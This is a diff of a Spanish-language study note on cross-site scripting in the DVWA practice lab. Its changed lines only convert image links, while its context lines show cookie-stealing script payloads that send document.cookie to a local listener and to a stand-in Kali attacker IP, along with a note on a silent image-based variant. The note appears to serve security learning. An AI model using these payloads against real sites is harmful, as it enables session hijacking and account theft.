@@ -6,8 +6,8 @@ _Correspondencia Fraudulenta Dirigida_: Un estafador envía una carta personaliz
 ```
 <script>alert(document.cookie)</script>
 ```
+![Pasted ima7](../images/Pasted%20image%2020251204011035.png)
 
-![[Pasted image 20251204011035.png]]
 **¿Qué significa esto?** Acabas de ejecutar código en tu propio navegador. Si esto fuera un ataque real, un hacker te enviaría un enlace con ese script oculto, y al hacer clic, tu navegador le enviaría tu cookie de sesión al atacante, permitiéndole robar tu cuenta.
 
 Que te "roben la cookie" significa que un atacante puede **clonar tu sesión activa** y hacerse pasar por ti sin saber tu contraseña. Es lo que en ciberseguridad se llama **Session Hijacking** (Secuestro de Sesión) .
@@ -29,8 +29,7 @@ python3 -m http.server 1337
 ```
 <script>window.location='http://127.0.0.1:1337/?cookie='+document.cookie</script>
 ```
-
-![[Pasted image 20251204013546.png]]
+![Pasted ima7](../images/Pasted%20image%2020251204013546.png)
 
 ```
 <script>window.location='http://IP_DE_KALI:1337/cookie='+document.cookie</script>
@@ -43,7 +42,8 @@ Payload Silencioso
 ```
 - **No serás redirigido.** Te quedarás en la página de DVWA como si nada hubiera pasado.
 - Como el navegador intenta cargar una imagen que no existe, no verás nada visual (o quizás un icono de imagen rota muy pequeño), pero el código JavaScript se ejecutará invisiblemente
-![[Pasted image 20251204015157.png]]
+
+![Pasted ima7](../images/Pasted%20image%2020251204015157.png)
 
 a nivel medio
 ```
